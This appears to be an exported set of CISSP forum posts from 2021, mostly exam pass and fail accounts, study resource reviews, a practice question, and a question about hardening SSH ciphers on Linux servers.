* [Army Ignited.]( https://www.armyignited.com/app/) Love it or hate it, this is here to stay. You will have a $4000 pool every year to use on certifications or regular Tuition Assistance. I am simplifying, but if you fail you have to pay the voucher fee back. Instead, you can enroll in a training course and get a “certification of completion” to say you have completed the course (but it just so happens to also include a voucher). And if you fail the real CISSP exam, you still pay nothing back. I did this route. I didn’t do any of the videos, just printed out the cert.  For more info about it or why, see [here]( https://www.cool.osd.mil/army/costs_and_funding/army_ca_faq.htm).
  
And there you have it--a somewhat easy guide to use for CISSP or really any certification. Also 2 other free resources I used were [Destination certification,]( https://www.youtube.com/c/DestinationCertification/playlists) which provided a decent overview/review (though I wouldn't use it for much beyond that). And Isc2’s [Glossary,]( https://www.isc2.org/Certifications/CISSP/CISSP-Student-Glossary) to just ensure you are operating with the same language.",2021-08-10
370,p24uqd,Passed at 100 questions today,"I think the things that helped me the most

1. Consistent study plan over several months. One hour per day during work week.
2. Boson practice exams. Worth the 90 bucks. Definitely the most similar practice questions to the exam.
3. Larry greenblatt on YouTube. He is a little hippy dippy but give him atleast 40 minutes of your time before you move on. His mindset helps you choose the best answer when you narrow it down to two or three answers.
4. Luke ahmed “think like a manager” book. This helps you understand that you should always prioritize policies, thinking before you act, and risk management. Again, helps pick the best answer.
5. Read the questions twice, atleast! I passed at 100 questions at exactly two hours. There were two questions where i was like “ok no clue move on”. But for the others, especially the ones that seems way too easy, read it again! There are almost always two answers that are right. Ask yourself - which is more specific? Is one answer too generic that now the scope is huge and you would waste money? 
6. Wear contacts. My glasses fogged so bad and it was distracting because of covid.
7. Be prepared for some noise distractions and don’t let it ruin your exam. The person next to me cleared their throat every 30 seconds and I was so angry. I broke the marker. Took a deep breath. And told myself to never give up. And then I went back to it.
8. This is a technical exam! You should know how the technologies work. Study what you don’t know and do a deep dive. Worst case scenario you understand a security topic like PKI really well and you use it in your job 3 years from now.

I’m glad I passed. I honestly don’t know if I would have had the strength to keep studying and retake. For those of you that keep failing and keep trying - you are strong. Keep pursuing what is meaningful to you and don’t let anything ruin your relationships and whatever else is important to you.",2021-08-11

374,p1at9r,Passed CISSP exam first try with ~5 months of study,"Hey everybody,

So I've been holding off to make this post until I had received my [official pass results](https://imgur.com/bkZZkEx) and sent in my application for endorsement.  Since I sent off my application the other day, I figured it was time to share my story.  This is going to be a long one, so I'll break it up into sections so you can read what you want.

    My Exam Experience

I wanted to start with this section as I feel it's the most important.  I took my exam at a professional Pearson testing center, about 2 hours away from my home.  My exam was on a Thursday, so I took that week off of work and reviewed every day from the moment I got up to the moment I went to bed.  I would wake up, chug some coffee, get to work, and sip on GFUEL all day to keep focused.  The day of my exam, I slept in, went for a walk, went out to IHOP for breakfast, and then drove to the testing center where I was an hour early so I could find the room where the exam was and then review in my car for a bit.  Going into the exam, I did not feel prepared, or that I knew all the information needed... but I have a rule about sticking to my exam date otherwise I'll keep pushing it back.  I figured if nothing else, I was about to take a REALLY good (and expensive) practice exam.  I honestly could have probably used another month of study to feel more comfortable.

I read some study that people who take adaptive exams generally score higher if they take their time on their first 10 or so questions, so I did that.  My overall strategy was that I would plan for like 110 questions, and then probably fail.  But I wanted to take my time and thoroughly read each question.  I figured my chances of actually going up to 150 were slim.  After the first 20 or so questions, I felt like the exam was focusing on all those little protocols, frameworks, and acronyms that you generally see once in your studies and brush off as not important.  It really drilled down on topics I didn't spend a lot of time on.  I received multiple questions about SOC, and honestly I could not recall the differences at all.  Pretty sure it kept asking them because I kept getting it wrong (be sure that when it was all over, I went and studied SOC).  After about 60 questions, I felt exhausted.  I felt like most of stuff that I studied and focused on memorizing didn't show up at all.  I stressed over memorizing Common Criteria tiers just before going in... not a single question about it.  Memorized SDLC and RMF... nothing about those.  I don't want to go into further detail due to NDA, but yeah.  Overall, around question 80, I was actually getting kind of mad lol.  I felt like 80% of my questions were ""what should you do if this happens"" or ""where would you find this listed"" types of things.  Overall it seems to be less about knowledge you've studied, and more what is best for this certain situation.

I focused hard until I got up to question 100, and before I clicked the button to submit my answer, I prepared myself to have either terribly failed, or totally passed.  I didn't know which.  It seemed like either my overall train of thought was going to be correct, or it wasn't.  After question 100, I had about 40 minutes left.  I kept slogging through each additional question, expecting the exam to end.  I ended up going all the way to 150 questions and ended with just seconds to spare.  I really had to kick up my speed after the initial 100, and I did NOT expect to go to 150, and had planned my slow reading strategy based on that... oh well!  I was exhausted when the exam was over.  I took my folded printout, went to the bathroom, then got in the elevator down to the parking garage.  I opened the printout in the elevator, and saw ""Congratulations!"" on the first line.  I let out the biggest and loudest cheer in my life.  I then had to sit in my car for 20 minutes before driving home just to relax and recover from the exam.

I'd love to be able to tell you ""study this"" and ""don't study this"", but honestly from all my time on here and asking others who have taken the test, it's impossible to say what's important and what's not.  Things I was told were super important didn't show up at all, and things I was told not to focus on popped up several times.  For the first day after I passed my exam, I was actually a bit angry because I felt like I spent so many nights focusing on learning material that didn't show up at all on the exam... but I realized that they can only quiz you on so many topics with such few questions.  So I must have shown early on that I knew certain related things, and diving deeper would be pointless.

    My Previous Experience

I have my Bachelor of Science in Computer Information Technology, but I wouldn't say this was much help aside from test-taking experience/strategy.  I achieved my CCNA last year, which made Domain 4 a breeze.  I got my Security+ in January, which I think was a good stepping stone into CISSP as it covered a lot of initial topics... Basically everything you learn in Sec+ is utilized in CISSP, so I don't see a downside to taking it first.  In February and March I took the AZ-900 and AI-900 exams since I got free vouchers from Microsoft's cloud skills challenges, so that helped me introduction to cloud topics (which is about as deep as CISSP goes).

I've also been working as a ""Server & Network Administrator"", leading the Network & Security team and Helpdesk team.  I've been working here for a little over 5 years, since I was hired on to an empty team right out of college, and learned everything on my own as I went.  It's been a long journey of having to just ""figure it out"" since I didn't have a mentor or someone who could teach me.  Just lots of google, troubleshooting techniques, trial & error, and tackling problems as they came along.  My job responsibilities include creating and managing Windows servers, SAN devices, a lot of old undocumented proprietary software, automation through powershell & command prompt scripting, data backups, SQL database management, IIS, active directory, DHCP, DNS, and network device (routers, switches, etc), PCI DSS audits, etc.  Basically a jack of all trades, master of none.

Originally I was going to go down the Networking route, but for these past couple years, I've been on a daily call with our parent company's Security team, and one of them mentioned having previously worked in Networking, but moving to Security as the market was in higher demand and the pay scale was higher, which perked up my ears.  I mostly sit quietly on the call and wait for something about our office or users to be mentioned, but being able to listen to them talk smart guy stuff and go over the SIEM and other cool software has been a huge motivator.  Then they recommended I go for CISSP.

Luckily, my job responsibilities have included things such as PCI DSS and ISO audits, and generating policies and procedures (Domain 1), data encryption and access controls (Domain 2), vulnerability scanning, patching vulnerabilities, establishing virtual & physical servers, and public server cryptography (Domain 3), network device configuration and hardening as well as port security (Domain 4), active directory and user security rights management (Domain 5), and (*unfortunately*) incident response and log management (Domain 7).  Thus, while I haven't worked specifically in security, I have had a little bit of experience across a lot of things... which I thought kind of fits perfectly with the ""mile wide, inch deep"" mentality.  I wouldn't say my experience was very big, but it helped me relate certain topics to work.

    My Resources

So... I kind of get nervous when it comes to studying and try to [get every resource](https://imgur.com/utz3mdE) I can find.  Which is a bit overkill, but at least I can see what sticks with me.  Admittedly, I'm more of a visual learning than a textbook reader.

**Thor Teaches on Udemy**    
This was my main resource, and where I gained the most knowledge.  I would load up these videos whenever I could focus and stare at the screen.  I even picked up a Microsoft Wireless Display Adapter so I could cast my browser on my Surface to my TV and sit on my couch and listen.  Great content, and his notes were fantastic.  I ended up printing out all his PDF notes and putting them in sheet protectors in a binder.  The only thing that sucked is that by grouping the lessons into two-domain courses, some courses (like the one that includes D3 & D4) end up being much higher value than the ones that focus on smaller domains.  Still, I'd highly recommend the series.  9/10

**Certification Station on Discord**    
This server on Discord was fantastic.  It really kept me motivated, and helped me work through the thought process on various questions.  If you stay active in the channel, you'll end up doing hundreds of practice questions without even thinking about it.  11/10

**MindMap videos by Rob Witcher on YouTube**    
I'm pretty sure I'm responsible for hundreds of plays on these videos.  These videos became my main audio source while walking or driving to work, and I'd even listen to them as I went to sleep.  It's a great way to refresh important topics as well as quickly go over a chapter before diving into it with a main resource.  And they're free.  Not enough deep info to learn everything, but just about the perfect  review resource.  You're crazy if you don't utilize these.  10/10

**CISSP Cert Prep (2021) by Mike Chapple on LinkedIn Learning**    
Some people like Mike Chapple's teaching method, and some don't.  But his updated LinkedIn Learning videos are very well produced, and include chapter quizzes to make sure you're taking in information rather than just zoning out.  It was another source I used primarily for audio, or for getting another perspective on a confusing topic from Thor's videos.  I do think it sometimes focused on less important things and glanced over big topics, but that may be because the course is designed to go along with the Official Study Guide textbook.  7/10

**Kelly Handerhan's CISSP course on Cybrary**    
Kelly is very passionate about what she teaches, which helps keep you motivated, but this video series really lightly glosses over the information.  It can serve as a good review or refresher, but shouldn't be your main video source.  However, it's free, so still nice.  5/10

**Adam Gordon's notes**    
So everyone on Certification Station knows of Adam's notes, which are freely available on the Discord server.  They've been formatted into a nice format by some users in the server that have made reading a lot easier.  I'm not sure if his ITPro.TV course offers something nicer, but I'd say the only thing these notes lack is looking nice and organized.  Otherwise, they are FULL of information and tricks to help remember certain things.  I'd highly recommend reading through these at least once.  8/10

**ISC2 CISSP Official Study Guide (2018)**    
Honestly, I didn't use this much.  I tried to read through it, but I felt it really dragged on through certain topics.  There's no reason Domain 2 should get as many pages as it does.  After reading through a few chapters, this became more of a reference book.  I'm sure it would be great for those that can read through it in full, but I couldn't do it.  6?/10

**CISSP Study Guide (3rd Edition) by Eric Conrad**    
I picked this book up because it was shorter than the OSG.  Where the OSG wanted 140 pages for something, this book covered it in 60.  Most of the reading I did came out of this book.  I highly preferred the condensed design, but the book was certainly showing its age.  This ""latest"" edition is from 2016, and could do with some updates.  6/10

**CISSP For Dummies (6th Edition)**    
I felt this book was great!  I don't see it recommended here enough.  It's from 2018, so reasonably updated.  I didn't read it through fully, but I could see it being a very competent primary reading source.  I used it mostly for reference to double-check things that didn't make sense in my video studies, or practice questions that confused me.  The only thing really lacking in this book is that the site for redeeming the online practice exams is defunct, so you have to call their support line to get an activation code on their new site.  Not a huge issue as I didn't really use their practice questions, but a noticeable issue.  It's also still smaller than the OSG.  7/10

**11th Hour CISSP by Eric Conrad**    
This book was just ok.  I bought both the physical and Audible versions.  Some people said they used it as a review after going over everything, but I think it's too light for that.  I think it would do well as an introduction book when you're first starting your studies and want to dip your toes into each domain first over the course of 200 pages.  Nothing to really learn much info from, but a good way to understand the general topics you'll be diving into.  5/10

**The Effective CISSP by Wentz Wu**    
This book is designed to be a focus on Domain 1 and 2, with a touch of 3.  For the most part, it does that.  I was expecting it to go into further detail than what I had already learned, but that wasn't really the case.  If you've paid attention in your primary study source, this will mostly just repeat what you've already learned, but that can be nice if it's been a while since you went over these topics.  It does give a good description between various steps and such.  Is the book necessary?  Not really... but if you want to hammer in these particular domains, it's a nice addition if you have time.  7/10

**How To Think Like a Manager by Luke Ahmed**    
I'd definitely recommend this book.  It's cheap, and goes over 25 questions and the thought process you should go through.  Best of all, it goes through a VARIETY of questions you would go through, such as ""pick the best out of a list of potentially correct answers"", ""you can easily eliminate two of these"", ""the actual question is asking you for something that can specifically be answered by only one of these"", etc.  The only issue I had with the book was one question (Q14) that focused on firewall architecture ""tiers"", which is not listed in any textbook, and the only video source I could find was one by Luke, and I still couldn't determine what a ""three-tier 2"" architecture and such were.  I spent a couple hours trying to figure this out, but then all of Certification Station agreed it didn't make any sense, and wouldn't show up in the exam, which it didn't.  8/10

**CISSP Exam Guide Ultimate Edition 2021 by Walter Roberts**    
Look... Stay away from this.  It's useless.  The layout is terrible, it looks like it was typed up in Microsoft Word and printed, it skips over important information, and focuses way too heavily on stupid stuff (we don't need two pages on what Malware is).  When I was going through my CCNA studies, I found a cheap book on Amazon called ""CCNA 200-301 Quick Reference Guide"" that was like $12, and 112 pages.  It included all of the exam objectives with a brief description and notes about each objective, allowing the reader to quickly reference each objective and see if they knew the topic or needed to read more.  I was looking for a cheap book that did something similar... just a quick reference of each topic so I could determine if I've missed something.  This book was not that.  At all.  The only reason it gets any points is because it was cheap.  2/10

    Practice Exams  & Quizzes

I used a ton of practice exams and quiz sources... I used the official ISC2 practice exam book, I used CCCure, I used practice questions from all the textbooks above, I used the new Pocket Prep app (whatever it's called now), Wentz and Adam's Q of the Day, etc.  Certification Station itself is a huge conglomerate of practice questions from various sources, so its hard to tell which one was which.  I wouldn't say I went through thousands of questions like many people here... probably a total of like 500-600.  Like many people here say, the practice exams are not like the real thing.  There may be a question or two that pop in and seem similar, but generally those questions are freebie questions anyways (straight to the point definition-like questions).  What I really aimed to do was identify my weak spots and then study those sections.  For me, the new Pocket Prep app was really useful for this because it gives a readout of your proficiency in each domain so I could see which ones I was lacking, and then go back and review those.

But honestly?  Whatever you're using is probably fine.  Don't be like me and waste a huge amount of time and money trying to find the ""best"" practice exams.  There aren't any, and ISC2 send C&D's to people who create questions too similar to the real thing (like with Wentz).  So you're not going to find perfect practice questions.  Just find something that helps you pinpoint your weak spots, and then review those sections.  The best thing you can do is practice and test your knowledge, so just find something and study.  Try to use a couple resources if you can so you can get a variety.

    In Closing...

The exam was tough.  I'm still surprised I passed, but it's encouraged me to continue my studies.  I wouldn't say I'm wayyy more knowledgeable than I was before I started studying... but that may be because I had a good basepoint.  I certainly learned a few interesting and useful things, and hammered down some stuff that I lightly touched on in other certs.

I plan on taking CISM next since the material is similar.  A lot of people just said to go take a few practice exams and then take the real thing, but I want to read through a bit before taking it, as I still feel like there are some CISSP topics I'm not too familiar with.  After that, I'm hoping to either jump into CySA+ or eJPT... I just feel like I've taken a lot of certifications involving knowledge and procedures, but I still have a huge feeling of Impostor Syndrome, and I don't feel like I have as many practical skills as I'd like.  I was offered a few ""Senior Security Analyst"" positions just minutes after posting that I passed the exam, but I still feel too inexperienced.  So overall I'm trying to find something that can prepare me for a more security-centric job.

378,p0gh9k,"Passed, 100q","Been seeing a lot of ""Passed!"" posts so thought I'd throw in my experience.

Just took the exam last night and passed at 100 questions at a little over an hour.

The key takeaway I want to pass on to you if you're studying: ***you can do it!***

Personal history: I'm old enough to have 2 kids in college, been doing IT and security since my career started in 1994, and I was a computer science major.  I've been involved in SOC audits, written security policies, and consulted with lots of companies regarding how to secure IT assets properly, including extensive HIPAA consulting.  Branched out and got EnCE forensic certification in 2014 and have been doing forensics and testimony in civil cases since then in addition to the other consulting.  Lots of other certs as well, including the suite of CompTIA and Microsoft. In a word, I have experience, and I know how to take tests.

I'd thought about getting CISSP starting in about 2010 but had put it out of my mind after seeing the commitment it takes to get it, and the Shon Harris book just sat on my shelf for 10 years afterwards.  Plus, I couldn't justify the cert as bringing anything to my resume that I didn't already have.  A colleague of mine wanted CISSP really bad though, so as a challenge I told him I'd go for it too.  We could study together and push each other along.  

2021 was our year, even with the exam being updated.  He is scheduled to take his in October and I've been encouraging him to study more, but life has a way of telling you that your focus needs to be on other things like family and work.  Same applied to me, but I started just giving myself little 10 or 20 question quizzes in between other obligations, or slipping in a Youtube video or a quick read of a few pages.  Eventually the quizzes worked up into 50 questions, and then I took full on 150 question exams.

Resources that are invaluable:

* RELEVANT EXPERIENCE.  This is passable without experience, but if you have worked even tangentially to security, lean on it.
* TEST TAKING. Practice tests count for a TON and gets you in the mindset.  Don't cheat on them.  If you're struggling, make them smaller, even if it's just 1-5 questions.  Get to where you are comfortable and then work your way up.  Whether you miss a question OR EVEN IF YOU GET IT RIGHT, read the explanation and refer back to the books.  Retake missed questions.
* REDDIT. Read your colleagues' experiences, but also be aware that there are some amazing resources here, including the actual authors of study guides and books, and professional trainers.  They don't hide, and don't be afraid to reach out.
* YOUTUBE.  There's so many free videos out there, and many are wonderful at getting the fundamentals ingrained in your mind.

Things I didn't do:

* Read any book cover-to-cover.  I didn't have time or inclination.
* Keep testing myself on subjects I was already familiar with.  For example, I knew I was strong in forensics, but weak in encryption.  So I focused more on encryption until I got comfortable with it.

Specific tools I used to study:

* BOSON.  I will swear up and down that Boson is what got me through this.  They've updated to the 2021 material.  The explanations for answers are top-notch.  By test day I was scoring 95%-100% on full exams.  The only (\*tiny\*) complaint I have about it is that the online version of the test doesn't let you create a custom exam to skip questions you've already answered X number of times, which the local installation does.
* CISSPREP. I hated this test bank with a passion, because it was so hard.  I never broke about 65% on it.  However, its questions really made me think, and were not just rote memorization answers.  I can definitely see the value in the questions it asks, but that doesn't mean I enjoyed taking them.
* ALL IN ONE CISSP EXAM GUIDE, 5th edition.  This one is a carryover from 2010 but was still really helpful, particularly in how security models came to be.  I'd obviously recommend getting the latest edition, but even the older ones still have merit.
* CISSP CBK 2015.   Also older, but still has merit.  Obviously don't seek out an older CBK, but work with what you have, and if someone gifts you older books or you have something in your personal library, don't throw them out.
* Most of all, /u/benmalisow one of the aforementioned authors and trainers active on /r/cissp, who was extremely generous with his time and helpfulness.

As I said above, ***you can do it!***  

It's challenging, yes.  

It's not the hardest test I've ever taken (EnCE was exponentially harder) but I did stop at some questions and just stare at them for a couple of minutes.  Other questions I answered in about 10 seconds.

With that said, the most applicable credential to what I do now is the CISA, but everything I've heard suggests that it's not that challenging for someone with a strong auditing background.

After an intense 5-day training course and a week of practicing exam questions, I took and passed the CISSP exam. It took me a little over an hour before I got the notification that the test was over. I just wanted to share my experiences for anyone who is planning to take the exam.

As many have already pointed out, the real exam is quite different from the practice exams. That doesn't mean that you'd be wasting your time doing the practice exams though.

In my experience, memorizing the correct answers (from practice exams) will not help you to prepare for the real exam. However, doing the practice exams can help you to read the questions (very) carefully. Sometimes, it takes only one word to completely change the meaning of the question (and subsequently the correct answer to it). When doing practice exams, I noticed that I usually finished them a lot faster than required. This encouraged me to take my time during the real exam.

I found the questions from the real exam to be more varied and less ""gruelling"" than the practice exams. 

One piece of advice I can give you is to really take the time to read and understand the question carefully. You have more than enough time to read it multiple times but once you answer it and move to the next one, you can't go back.

Good luck with your exam!",2021-08-03

I've completed CISM & CRISC in the last few months. 

Looking to move to CISSP now, starting with OSG 9th edition.

My main conern is which practice questions tests are really close to CISSP exam like ISACA certifications have QAE?

Does OSG 9th edition practice questions are enough or should I refer others too like ISC2 official practice tests, BOSON, Luke Ahmed, Pocket Prep, CISSPprep, Shon Harris questions & Thor teaches? (These lists are overwhelming and I'd like suggestions how can I filter it down to practice questions sets which is closer to the actual exam please?)

I have been studying for the CISSP exam for the last few months, thanks to covid none of the testing centres were open for a while therefore I lost my drive to study as hard as I would have liked.   


I find myself getting tired of reading the books really quick and wanted to change it up to try practice exams to help me focus on the holes in my knowledge.   


I have been recommended by a colleague to try the Boson practice exams but I hear the questions are not always completely accurate and given the $99 dollar price I want to be sure of what I am buying.

404,owdfw6,Fun CISSP Practice Question,"\*\*Admin(s) Please Delete If Not Helpful\*\*

By the end of 1989, the price of ROM chips was dropping enough that Capcom game designers Akira Nishitani and Akira Yasuda began their ambitious plan for Street Fighter 2. Senior management asked the two designers to stay in-line with the original game and keep it straight forward. Management also asked for a quick turnaround to compete with other upcoming game releases such as Midway’s Mortal Kombat.

While the designers wanted to stay within the confines of the original game structure, they also wanted the freedom to try new things during development with the new ROM chips. Their goal was to create a list of skilled and iconic characters each with their own special abilities. For example, the additional memory space allowed the character Guile to have his Low Kick flipped to look like an upside-down air kick. And as Dhalsim’s limbs started getting longer and longer with each development iteration, it could be counter-balanced by making the character move slower. E. Honda’s flying attack and Chun Li’s Spinning Bird Kick were also newly added memory spaces on the ROM boards. These moves pushed the game from realistic to unrealistic, and added to its charm.

48-bits of data were allocated on the game boards to accommodate these changes.

This resulted in characters slowly increasing their assigned memory while in production and sometimes required a quick fix. In order to make these constant changes, Nishitani and Yasuda needed an accelerated development process with the final end-result already defined, but with the flexibility to allow for improvements while prototyping designs, going back and cutting animation frames for memory conservation, and re-examining system motherboard architecture. The designers needed the ability to constantly build, demonstrate, and refine their game animation changes.

Which of the following software development models would best fit this environment?

A. Waterfall method  
B. Rapid Application Development  
C. Joint Application Development  
D. Spiral Model

405,ovz7o7,CISSP Passed in first attempt,"Hello Everyone,

I provisionally passed my CISSP exam yesterday.

The exam was Ok in the beginning and I it was brutal after 20 questions, and I never felt that I am going to Pass it. I feel it tests your patience as well during the exam.

I spent around 30 minutes for first 15 questions and started increasing my speed after 60 questions, when my exam  finished I was having 50Q and 50 minutes left.

&#x200B;

IMPORTANT \*\*\*\*\*\*\* Try to write your notes in the sequence/way that exam expects from you.. Like Advantages/disadvantages of each thing e.g. RBAC, Access models (Write them in series from Most to Least, Primary and Secondary etc.). It will help you with the exact mindset of the exam...

Reading book is very important..

&#x200B;

Resources I used:

&#x200B;

Sybex OSG 8th edition

11th hour

and Adam's Bootcamp noted from Discord

Thor's Udemy course and old question bank

Kelly's Cybrary Course to refresh the knowledge

BOSON and Sybex Official practice test (recommended)

Luke Ahmed's subscription (too much information in the questions, in exam questions are pretty small 2-3 lines max and will clear descriptions)

CISSPrep Question (not same like exam, don't take these question near to exam. If English is not your first language then it will give you some tough time, but it may improve your thinking skill)

&#x200B;

Again, This is my experience, I didn't like the lengthy questions but if it works for you then it is good else don't spend too much time and move on..

&#x200B;

One recommendation, scores of the practice questions is not relevant, I was getting 40%-50% in Luke questions, which was kind of demotivation for me, so I just completed them without looking at the result.

Still, I managed to passed at 100Q, I was still feeling that I am not fully prepared (even after passing the exam :D )... so you will be never prepared the exam....

&#x200B;

The new Questions of Sybex Official guide are better than previous version.

408,ovm35i,Failed today at 150 questions,"Welp...i kinda saw that coming. I felt very unprepared the 2 weeks before the exam. The more i crammed, the less i felt like i knew. Practice tests range from 50-68%, which was discouraging. 

I have a bachelor's in business management (2011) and a masters in information technology systems (2020). I work as a research analyst for a small tech company. My everyday job isn't technical or managerial, but i have done some light technical work here and there for the company the past 9 years I've been there. I thought the test was pretty technical. Especially domain 4, my greatest nemesis. 

Started studying beginning of May. I tried to read the shon harris book, but was overwhelmed (only got through 1/2 book) At the end of may, i took a few practice tests and got around 50%. Only studied about 3hrs on a good day, much less or none on busy days. 

June, used the 11th hour to get to know the domains and then go into detail with videos, research, and shon harris book. Started doing practice test questions every other day. Was feeling better in June.... Then life happened. Didn't study for ~3 weeks. I kept thinking i had time left to study in july. 

July comes and things don't cool downwith life stuff. I was thinking of rescheduling but my mom convinced me to keep my date. It will force me to study, which i agreed with. Didn't get any better. Was only able to study everyday for ~3hr. 

Took a week off work before the exam to cram. That was the bulk of my study time, but even on the week of, i studied 5-6hr. 

I think the practice tests i used were representative of the exam. The sybex practice questions were pretty good, especially in how it is worded. The questions were similar, but the answer choices in the actual exam were more tricky.
They were not as obvious as the practice tests. I was able to narrow questions down to 2 answers. I took too much time in the beginning 50q and didn't have enough time for the rest of the test. Ended up rushing the last bit. 

Knew i failed when the last few questions were straight forward and much easier. Got a lot of legal and regulatory questions that i didn't know because glossed over those in my studies.

Study materials: 
Shon harris all in one CISSP (mostly used to do practice tests. Did ~700q)

11th hour

Sybex 3rd edition practice tests (did ~200 questions. Bought too late in July) 

Destination mind map videos (watched each vid 2x + took notes) 

Cissp cram series (watched each video 2x + followed slides)

Day before exam listed to how to think like a manager by Luke Ahmed and eric conrad's cissp cram session 

My plan for the 2nd time (hopefully last): 
Boot camp. I'm really bad with self study and need some structure. Plus, can tell people in my life i have to go to school for a chunk of time

More practice questions. Want to do all the questions i have

Look for an audio book version of a prep book 

Study things in detail. Deeper understanding of the WHY! 

TLDR: didn't study enough, didn't pass. Time management and discipline are important. Cramming didn't work :(",2021-08-01
409,ovu73a,Standard and safe ciphers,"
I am checking some Linux servers and can see ciphers for basically two: SSL and SSH.  For SSH I can see some deprecated ciphers like CBC, MD5, arcfour which needs to be removed. if I categorize ciphers for SSH, then they are 4 types: 1. Kex (diffie-hellman-group-exchange-sha256) 2. Server host key (rsa, dss) 3. Encryption (ctr, aes, chacha20-poly, cbc etc) 4. Mac-algorithms (hmac-sha2-256). 5 Compression (none)
1.	Could there be ciphers for other services else than SSL and SSH too that needs to be checked?
2.	Getting rid of older and deprecated ciphers (like arcfour, md5) are obvious but what about removing kex algorithm (like Diffie Helman), or Chacha20-poly etc?  Is there a standard list of ciphers for Linux servers, something recommended by NIST or else?
3. Will removing ciphers cause compatibility issues?

416,ouob9r,Provisionally Passed Yesterday @ 150 Questions,"Hello all. I have been quietly following the CISSP reddit thread for the past two years. Before I get into the journey, I will tell you about my background. I have been in the IT industry for 15 years wearing many hats along the way. I was a managed services network engineer for most of it, although I also worked on systems and security in these roles. I was also an ISO/IT Manager for about four years in the financial industry. I am currently working as a network engineer in the media and broadcast industry. I currently hold CCNP r/S, MCSA/MCSE 2016, A+, Network+ and CISM.

&#x200B;

I have been studying for the CISSP off and on for the last two years. I was hoping to test in early 2020, but the testing centers closed for a while due to COVID. I studied the official study guide (read it cover to cover) and finished the 11th hour by Eric Conrad. This took about two weeks. I tried to read the Shon Harris edition, but I wasn't captivated by the writing style. It felt like reading a dictionary. The official guide was still a hard read, but I was able to keep up with the progression. I also used several practice tests including: the official practice tests, Boson, Shon Harris practice questions and PocketPrep. I would test myself on random questions and when I did poorly, I would review chapter material or concepts.

&#x200B;

After I learned that ISACA allowed online testing, I scheduled my CISM test for May of 2020. Unfortunately, I had technical issues logging into the exam environment so I was not able to take the test. Support did issue me a voucher to retake the exam, but I did not end up taking the exam until April 2021. Not wanting my voucher to expire, I studied the All-In-One study book for the CISM and used the QAE question bank to help (re)prepare. I thought both were essential for passing the CISM exam. I was able to pass the CISM when I took it in April 2021; thankfully I had no technical issues this time. The proctor had me scan the room, under the desk, etc. to ensure a secure test environment at home. It took about two weeks to have my work experience approved, maintenance fees, etc. until I was finally CISM certified.

&#x200B;

I told my employer about my new credentials and my interest in cybersecurity management. They requested I take the CISSP as it was viewed as a harder tested (I'll comment on that later). I ordered the ninth edition of the Official study guide and started my studies with a focused approach on my weak domains. I continued to use my practice tests to focus on these areas. I used PocketPrep and Boson for most of it. When I started using Boson, I was averaging 60-70%. After two months of studying, I was able to bring that up to 80-90% on average. I bought the CCCure questions, but only used them a few times. I heard on this forum that Boson was the best and I agree with that. I finally decided to schedule a date and get it done. I picked 7/29 as my test date and I was a nervous wreck leading up to the exam date. I felt I understudied, unprepared, etc. even though I have been studying hard for the last several months. I read the 11th hour book cover to cover to brush up on my topics. I read this until the late morning on the day of my test. My test was at 2 PM. I also watched the Kelly (Why you will pass the CISSP) video and Larry's videos and they will essential for gaining the right mindset. DON'T FIX ANYTHING!!! Cost benefit analysis for each solution. Management answers are always applicable. Focus on human life.

&#x200B;

I did a few Boson practice questions in the parking to get into the mindset of reading the questions slowly (once, twice), reading the answers slowly (once, twice). All the time to think like a manager, not an engineer. My heart rate was up and I was stressing out. I finally made my way into the testing center for the moment of truth. After the palm scans, NDA and all the processing, I finally started the exam. What I read on this forum was accurate. These were like no questions I have ever seen in my practice test bank. I had a handful that were like that, but most were scenario based. You have to completely understand the concepts and when to use them. I would read the question two or three times, figure out what they were asking and then select the appropriate or best answer. I also proved the other answers were incorrect or less accurate than the answer I chose. Several questions were way out of left field and I used an educated guess to eliminate the wrong answers. After going past 100 questions, I really thought I was headed for failure. I was thinking, all that studying and it is still not enough. I even visualized my next steps, like attending a boot camp. Nevertheless, I continued to answer each question as if it would make or break my passing grade. I finally got to question 150 with about an hour left and clicked finish exam. I was surprised it didn't have a survey like the other exams I have taken.

&#x200B;

I had to go through the checkout process (ID and palm scans again). The proctor verified my name on the printout and I noticed when she was holding it, it did not have bar graphs like I heard similar to a failure report. When she handed it to me, I saw ""Congratulations"" and said aloud, ""Well I wasn't expecting that."" haha I'm so glad I stuck with it and continued to fight for the win. I feel the networking questions pushed me over the top since that is my strongest area. I know I didn't ace it at 100 questions, but I tried my best and that is all that mattered to me. I look forward to the future this certification will bring. If anyone has tips on staying on top of the CE's, I would greatly appreciate it.

&#x200B;

I feel the CISM will help prepare you for the CISSP, but while they are similar, they are also very different. The CISM is more management focused without the high level technical knowledge required for the CISSP. Both exams were very challenging. CISM is paramount if you plan to pursue a Infosec Manager role and analyzing/reporting risk to C-level executives. There is a lot of overlap between the two, but studying for one doesn't necessarily prepare you for the other without additional study.

&#x200B;

Whatever your journey may be, I wish you all the best and I'm happy to answer any questions that do no break the NDA.

I also used Anki a lot and this subReddit group.

The Sybex content prepared me for the technical part of the exam, the questions on Study Notes and Theory as well as How to Think Like a Manager and CISSPrep.net prepared me for the manager mindset. Mike Chapple’s LinkedIn CISSP class put everything together for me.

I also paid for a month subscription to the PocketPrep app to gain access to all of the questions and just hammered practice questions at night between my bootcamp last week and my exam this morning.

It stopped me at 100q after about 100 minutes.

I think experience had the biggest role in me passing.  I've done most everything covered by the domains, but there's also definitely a ""mindset"" that you have to put yourself in when you take the exam.  It was the same for the CISM.

I am so relieved to have it behind me... and want to encourage those of you that are planning to take it, book the exam now.  Having that ""deadline"" helps with the mental aspect of prepping.  You HAVE to do it if you have an exam appointment.

Good luck, all!",2021-07-29

426,ou4xez,"Failed, 150 questions","So today I took my first CISSP exam and failed. I guess I am wondering is it possible to determine if I was close to passing or not? I was above proficiency on two domains, near proficiency on five domains and below proficiency on one domain. Now I understand that near proficiency isn’t enough but does near mean that I was a question or two off from being above? Ive read that if you are below on lower weighted domains it is possible that if you are above on higher weighted domains you can make up for it? 

How near to passing is ‘near proficiency’ 

I just wish they gave me a little more breakdown of how close I was exactly. I have been studying for the past 6 weeks( min. 4 hours a day) one week was a boot camp. I have 8 years security experience and 7 years system administration experience and thought I was doing everything right leading up to the exam. But after leaving the exam, I don’t know what to go back and review for my second attempt. Most of the questions were opinion based “choose BEST” answers which all of them were correct just had to choose the “more” correct answer. The domain I was below proficiency on , during my practice questions I was above 80% on, so I am just really discouraged and would appreciate any tips on how I should move forward.",2021-07-29

